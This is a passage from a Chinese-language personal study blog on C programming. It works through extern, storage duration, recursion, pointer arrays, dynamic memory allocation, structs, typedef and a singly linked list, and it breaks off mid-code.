<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;我是用指针调用的内部函数函数&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="title">void</span><span class="params">(*P)</span><span class="params">(<span class="keyword">void</span>)</span></span>=f;<span class="comment">//定义了一个指向f的全局指针</span></span><br></pre></td></tr></table></figure>

<p>下面写几个值得注意的点：</p>
<p>1.在不同文件中可以有重名的外部函数吗？</p>
<p>答案是不可以</p>
<p>2.系统如何处理函数的声明</p>
<p>函数声明，先从本文件中寻找函数的定义，找不到，再从其他文件中寻找外部函数的定义。</p>
<h2 id="变量的存储方式和生存期"><a href="#变量的存储方式和生存期" class="headerlink" title="变量的存储方式和生存期"></a>变量的存储方式和生存期</h2><p>变量的存在时间就是生存期，在程序运行的整个过程中都存在的变量是在内存的静态存储区存放的。有的变量则是在调用其所在函数时才临时分配存储单元，调用结束后该存储单元被释放，这种变量是存放在内存的动态存储区的。</p>
<p>每一个变量和函数都有数据类型和数据的存储类型</p>
<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230825092317624.png" alt="image-20230825092317624"></p>
<p>注意：建立存储空间的声明是定义声明（如<code>int a;</code>），不需要建立存储空间的声明是引用声明（如：<code>extern int a;</code>）</p>
<h2 id="undef-extern和函数声明注意的小知识点"><a href="#undef-extern和函数声明注意的小知识点" class="headerlink" title="_undef,extern和函数声明注意的小知识点"></a>_undef,extern和函数声明注意的小知识点</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> AB;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> AB;<span class="comment">//我们可以多次终止一个宏名的作用域，及时它没有被定义</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">int</span> a;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">int</span> a;<span class="comment">//我们也可以多次扩展一个没有被定义的变量的作用域</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">void</span>)</span></span>;<span class="comment">//我们也可以多次声明一个没有被定一个的函数</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="递归求5的阶乘"><a href="#递归求5的阶乘" class="headerlink" title="递归求5的阶乘"></a>递归求5的阶乘</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> a)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (a == <span class="number">1</span> || a == <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (a &gt; <span class="number">1</span>)</span><br><span class="line">		<span class="keyword">return</span> a * f(a - <span class="number">1</span>);<span class="comment">//递归直到a=1</span></span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;<span class="comment">//小于0的情况</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, f(<span class="number">5</span>));</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="第八章-指针"><a href="#第八章-指针" class="headerlink" title="第八章 指针"></a>第八章 指针</h1><h2 id="指针数组和多重指针"><a href="#指针数组和多重指针" class="headerlink" title="指针数组和多重指针"></a>指针数组和多重指针</h2><p>指针数组：</p>
<p>1.一个数组，若起元素均为指针类型数据，成为指针数组。</p>
<p>2.定义指针数组的一般形式：类型名*数组名[数组长度];</p>
<p>3.如<code>int *p[4];</code>,由于[]比<code>*</code>优先级高，因此p先与[4]结合，形成p[4]，这显然是数组的形式，表示p数组有4个元素。然后p[4]再和<code>*</code>结合，表示此数组的每个元素都可以指向一个整型变量。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">(<span class="keyword">char</span>* a[<span class="number">4</span>])</span> </span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c\n&quot;</span>, *a[i]);<span class="comment">//调用指针数组中的指针</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> q = <span class="string">&#x27;1&#x27;</span>, w = <span class="string">&#x27;2&#x27;</span>, e = <span class="string">&#x27;3&#x27;</span>, r = <span class="string">&#x27;4&#x27;</span>;<span class="comment">//定义四个字符</span></span><br><span class="line">    <span class="keyword">char</span>* zz1 = &amp;q;</span><br><span class="line">    <span class="keyword">char</span>* zz2 = &amp;w;</span><br><span class="line">    <span class="keyword">char</span>* zz3 = &amp;e;</span><br><span class="line">    <span class="keyword">char</span>* zz4 = &amp;r;<span class="comment">//定义四个指针</span></span><br><span class="line">    <span class="keyword">char</span>* a[<span class="number">4</span>] = &#123; zz1, zz2, zz3, zz4 &#125;;<span class="comment">//将指针存入数组</span></span><br><span class="line"></span><br><span class="line">    show(a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>多重指针：</p>
<p>1.利用指针访问一个变量就是“间接访问”</p>
<p>如果一个指证变量中存放了个目标变量的地址，这就是“单级间址”</p>
<p>如果一个指针变量中存放的是一个地址并且这个地址指向了一个目标变量，这就是“二级间址”；</p>
<p>间址方法可以衍生更多级，即多重指针。</p>
<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230825102159911.png" alt="image-20230825102159911"></p>
<h2 id="指针数组做main函数形参"><a href="#指针数组做main函数形参" class="headerlink" title="指针数组做main函数形参"></a>指针数组做main函数形参</h2><p>1.main函数无参时(如：<code>int main(void)</code>)调用main函数时b不必给出实参。</p>
<p>2.main函数可以带参，例如<code>int main(int argc , char * argv[])</code></p>
<p><code>argc</code>和<code>argv</code>是main函数的形参，他们是程序的命令行参数.</p>
<p>argc表示参数个数，arcv表示参数向量，他是一个字符指针的指针变量，其每个元素指向一个字符串</p>
<p>3.一个带参main函数程序的运行</p>
<p>就是执行命令行里面的就行了。。。</p>
<h2 id="void指针"><a href="#void指针" class="headerlink" title="void指针"></a>void指针</h2><p>1.void就是基类型的。</p>
<p>2.指向void类型可理解为“指向空类型”或者“不指向确定的类型”。也就是说指向的数据类型的字节长度不确定</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> * p3;</span><br><span class="line"><span class="comment">//这个p3是不能直接用来访问的</span></span><br><span class="line"><span class="comment">//如果要用p3访问数据，需要强制转换成指定类型的指针才可以。</span></span><br></pre></td></tr></table></figure>

<h2 id="动态内存分配"><a href="#动态内存分配" class="headerlink" title="动态内存分配"></a>动态内存分配</h2><p>1.全局变量在内存的静态存储区存放。</p>
<p>2.非静态的局部变量（包括形参）是分配在内存中的动态存储区的，这个区域称为栈，</p>
<p>3.c语言还允许建立内存动态分配区域，以存放一些临时用的数据，这些数据不必在程序的声明部分定义，也不必等到函数结束时才释放，需要时随时开辟，不需要时随时释放。这个存储区成为堆，此类数据只能通过指针来引用.</p>
<p>举个例子</p>
<p>输入学生数，再输入每个学生对应的姓名和成绩，最后把这些信息输出。 </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入学生数:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="comment">//void *malloc(unsigned int size)</span></span><br><span class="line">    <span class="comment">//其功能是在堆区分配连续的size个字节的存储空间并且返回这段存储空间开头位置的地址</span></span><br><span class="line">    <span class="comment">//如果内存分配失败，会返回空指针</span></span><br><span class="line">    <span class="keyword">int</span>* p1 = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>) * n);</span><br><span class="line">    <span class="comment">//上面这一句的意思就是一个int是4个字节，这里就是分配了连续的4乘以n个的内存空间</span></span><br><span class="line">    <span class="comment">//并且把这个地址的首字节的地址赋值给了p1</span></span><br><span class="line">    <span class="keyword">if</span> (p1 == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;内存分配失败，程序退出\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);<span class="comment">//返回给操作系统-1，表示不是正常结束</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>(*p2)[<span class="number">50</span>] = (<span class="keyword">char</span> (*)[<span class="number">50</span>])<span class="built_in">calloc</span>(n, <span class="keyword">sizeof</span>(<span class="keyword">char</span>) * <span class="number">50</span>);<span class="comment">//指针数组</span></span><br><span class="line">    <span class="comment">//calloc 函数被用来动态地分配内存以存储n个长度为50的字符数组。</span></span><br><span class="line">    <span class="keyword">if</span> (p2 == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;内存分配失败，程序退出\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);<span class="comment">//返回给操作系统-1，表示不是正常结束</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;请输入第%d个学生的成绩和姓名：\n&quot;</span>, i + <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, p1 + i);<span class="comment">//通过指针接收</span></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, p2[i]);<span class="comment">//放到对应的指针数组中</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;第%d个学生的成绩是%d，姓名是%s\n&quot;</span>, i+<span class="number">1</span>, *(p1 + i),p2[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p1);<span class="comment">//必须是一个指向动态内存空间的指针</span></span><br><span class="line">    <span class="built_in">free</span>(p2);<span class="comment">//释放内存</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230826084815313.png" alt="image-20230826084815313"></p>
<p>后续的动态内存我就不写了，所以算了，暂时参考一下大纲，后续再继续深度学习c语言。</p>
<h1 id="第九章-用户建立自己的数据类型"><a href="#第九章-用户建立自己的数据类型" class="headerlink" title="第九章  用户建立自己的数据类型"></a>第九章  用户建立自己的数据类型</h1><h2 id="结构体定义和初始化"><a href="#结构体定义和初始化" class="headerlink" title="结构体定义和初始化"></a>结构体定义和初始化</h2><p>c语言允许用户自己建立由不同数据组成的组合型的数据结构，它称为结构体。在啊其他一些高级语言中称为“记录”。</p>
<p>定义结构体的一般形式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struc 结构体标记 //sruct+结构体标记，即结构体的类型名</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Student</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">30</span>];</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">double</span> score;</span><br><span class="line">&#125;;<span class="comment">//感觉就是类啊</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Student</span> <span class="title">a</span>;</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入学生的姓名，年龄和成绩：\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s%d%lf&quot;</span>, &amp;a.name, &amp;a.age, &amp;a.score);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;学生的姓名：%s,年龄：%d,成绩：%lf&quot;</span>, a.name, a.age, a.score);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230826103056621.png" alt="image-20230826103056621"></p>
<p>用指针也可以来访问这个类，如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Student</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">30</span>];</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">double</span> score;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Student</span> <span class="title">a</span>;</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入学生的姓名，年龄和成绩：\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s%d%lf&quot;</span>, &amp;a.name, &amp;a.age, &amp;a.score);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span>  <span class="title">Student</span>* <span class="title">p</span> =</span> &amp;a;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;学生的姓名：%s，学生的年龄：%d，学生的成绩：%lf&quot;</span>, p-&gt;name, p-&gt;age, p-&gt;score);<span class="comment">//指针来访问</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230826103544124.png" alt="image-20230826103544124"></p>
<p>下面解释一下，<code>a.name</code>中间的.是结构体成员运算符，而<code>p-&gt;name</code>指向结构体成员运算符。这两个运算符和圆括号方括号一样，都是优先级第一的结构运算符。结合方向都是自左往右的</p>
<p>上面的形式也可以用完全初始化和不完全初始化，如下</p>
<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230826104110437.png" alt="image-20230826104110437"></p>
<p>值得注意的是，结构体标记和变量至少有一种。如果有变量，可以进行初始化。</p>
<h2 id="结构体类型的变量在内存中占的字节长度"><a href="#结构体类型的变量在内存中占的字节长度" class="headerlink" title="结构体类型的变量在内存中占的字节长度"></a>结构体类型的变量在内存中占的字节长度</h2><p>字节对齐：各种数据类型是按照一定的规则在内存当中排列的。</p>
<p>基本数据类型变量的地址是能够被它们所占字节的长度所整除的。</p>
<p>关于结构体：</p>
<p>1.结构体变量的首地址能够被其最宽基本类型成员的大小所整除。</p>
<p>2.结构体成员相对于结构体变量的首地址的偏移量（结构体变量的首地址编号和结构体成员的地址编号他们之间所差的字节数）都是其成员大小的整数倍</p>
<p>3.结构体的总大小为结构最宽基本类型成员的整数倍</p>
<h2 id="结构体数组和指针"><a href="#结构体数组和指针" class="headerlink" title="结构体数组和指针"></a>结构体数组和指针</h2><p>输入n个学生的姓名和成绩并按成绩排序输出。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 3</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Stu</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">30</span>];</span><br><span class="line">    <span class="keyword">double</span> score;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">input</span><span class="params">(struct Stu* p, <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;请输入第%d个学生的姓名和成绩：\n&quot;</span>, i + <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s%lf&quot;</span>, &amp;p[i].name, &amp;p[i].score);<span class="comment">//这里name是数组，其数组名本身就是地址,所以取地址符可以省略</span></span><br><span class="line">        <span class="comment">//scanf(&quot;%s%lf&quot;, (p+i)-&gt;name, &amp;(p+i)-&gt;score);//和上面一样的，只不过这个是通过指针来访问</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">(struct Stu* p, <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;第%d个学生的姓名：%s，成绩：%lf\n&quot;</span>, i + <span class="number">1</span>, p[i].name, p[i].score);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">(struct Stu* p, <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 冒泡排序</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; len - i - <span class="number">1</span>; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (p[j].score &gt; p[j + <span class="number">1</span>].score) &#123;</span><br><span class="line">                <span class="comment">// 交换位置</span></span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">Stu</span> <span class="title">temp</span> =</span> p[j];</span><br><span class="line">                p[j] = p[j + <span class="number">1</span>];</span><br><span class="line">                p[j + <span class="number">1</span>] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Stu</span> <span class="title">a</span>[<span class="title">N</span>];</span></span><br><span class="line">    input(a, N);</span><br><span class="line">    sort(a, N);</span><br><span class="line">    show(a, N);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里面就是有结构体数组了，然后就是用指针调用了数组里面的结构体。</p>
<h2 id="如何理解复杂的数据类型"><a href="#如何理解复杂的数据类型" class="headerlink" title="如何理解复杂的数据类型"></a>如何理解复杂的数据类型</h2><p>1.如何理解<code>int (*p)[5]</code>的含义呢？</p>
<p>首先我们可以看看int[5],将int[5]当做一个数据类型，设其为A。则<code>int a[5]</code>就相当于Aa.</p>
<p>同理我们可以把<code>int (*p)[5]</code>转化成<code>A *p</code>,因为A是一个含有5个整型元素数组类型，所以A*就代表是一个含有五个整型元素的数组的指针类型，那么p就是该类型的变量。</p>
<p>2.那么如何理解<code>int (*p)(int)</code>所代表的含义呢？</p>
<p>我们把<code>int (int)</code>当成一个数据类型，并设一个数据类型A和其等价，则<code>int f(int)</code>和<code>A f</code>等价。同理我们可以把<code>int(*p)(int)</code>转换成A*p。</p>
<p>因为A是一个返回值是int，形参为int的函数类型，所以A*就是一个返回值是int，形参为int的函数的指针类型，那么p就是该类型的变量。</p>
<p>结论：看变量所属括号的最外层，把最外层的数据类型设为一个新的数据类型，然后去掉变量最外层的花括号。通过这种方法，知道原式转化成“数据类型 变量”的形式。</p>
<p>通过类似的方法，我们可以理解如下复杂类型的数据。</p>
<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230828082552556.png" alt="image-20230828082552556"></p>
<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230828083302155.png" alt="image-20230828083302155"></p>
<h2 id="用typedef声明新类型名"><a href="#用typedef声明新类型名" class="headerlink" title="用typedef声明新类型名"></a>用typedef声明新类型名</h2><p>按照定义变量的方式，把变量名换上新类型名，并且在最前面加<code>typedef</code>，就声明了新类型名代表原来的类型。</p>
<p><code>typedef int count</code>这个时候count就代表的是int类型的数据。<code>count a = 3;</code>这个a就是个整型数据。</p>
<p><code>typedef int Num[3]</code>定义了一个含有3个int类型的数组的数据类型。<code>Num b=&#123;1,2,3&#125;</code></p>
<p>其实就是别名</p>
<p>同样也可以定义结构体</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line">    <span class="keyword">double</span> b;</span><br><span class="line">&#125;Stu;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    Stu m = &#123; <span class="number">1</span>,<span class="number">23</span> &#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n%lf&quot;</span>, m.a, m.b);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230828085028257.png" alt="image-20230828085028257"></p>
<h2 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h2><h3 id="单向链表"><a href="#单向链表" class="headerlink" title="单向链表"></a>单向链表</h3><p>一般头结点不存放有效数据（当然你也可以根据情况而定），在其他节点存放有效数据。</p>
<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230828085837360.png" alt="image-20230828085837360"></p>
<p>上一个节点的最后一个元素都是指向下一个节点的第一个元素的地址。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">pnext</span>;</span> <span class="comment">// 指向下一个节点的指针</span></span><br><span class="line">&#125; N, * P;<span class="comment">//这个P就是对Node的指针</span></span><br><span class="line"></span><br><span class="line"><span class="function">P <span class="title">create</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123; <span class="comment">// 创建链表头节点</span></span><br><span class="line">    P phead = (P)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(N)); <span class="comment">// 分配内存</span></span><br><span class="line">    <span class="keyword">if</span> (phead == <span class="literal">NULL</span>) &#123; <span class="comment">// 检查内存是否分配成功</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;分配内存失败，程序退出\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    phead-&gt;pnext = <span class="literal">NULL</span>; <span class="comment">// 初始化链表头节点的指针域</span></span><br><span class="line">    <span class="keyword">return</span> phead;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">input</span><span class="params">(P phead, <span class="keyword">int</span> value)</span> </span>&#123; <span class="comment">// 添加节点到链表尾部</span></span><br><span class="line">    P last = phead;</span><br><span class="line">    <span class="keyword">while</span> (last-&gt;pnext != <span class="literal">NULL</span>) <span class="comment">// 找到链表最后一个节点</span></span><br><span class="line">        last = last-&gt;pnext;</span><br><span class="line"></span><br><span class="line">    P newnode = (P)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(N)); <span class="comment">// 分配新节点的内存</span></span><br><span class="line">    <span class="keyword">if</span> (newnode == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;分配内存失败，程序退出\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    newnode-&gt;data = value; <span class="comment">// 设置新节点的数据</span></span><br><span class="line">    newnode-&gt;pnext = <span class="literal">NULL</span>; <span class="comment">// 将新节点的指针域设为 NULL，表示新节点为链表的最后一个节点</span></span><br><span class="line"></span><br><span class="line">    last-&gt;pnext = newnode; <span class="comment">// 将新节点连接到链表中，成为链表的最后一个节点</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">(P phead)</span> </span>&#123; <span class="comment">// 遍历并展示链表中的数据</span></span><br><span class="line">    P p = phead-&gt;pnext; <span class="comment">// 获取链表的第一个节点</span></span><br><span class="line">    <span class="keyword">while</span> (p != <span class="literal">NULL</span>) &#123; <span class="comment">// 循环遍历链表的每个节点</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, p-&gt;data); <span class="comment">// 打印节点的数据</span></span><br><span class="line">        p = p-&gt;pnext; <span class="comment">// 移动到下一个节点</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">len</span><span class="params">(P phead)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    P p = phead-&gt;pnext; <span class="comment">// 获取链表的第一个有效节点</span></span><br><span class="line">    <span class="keyword">while</span> (p != <span class="literal">NULL</span>) &#123; <span class="comment">// 循环遍历链表的每个有效节点</span></span><br><span class="line">        sum++;</span><br><span 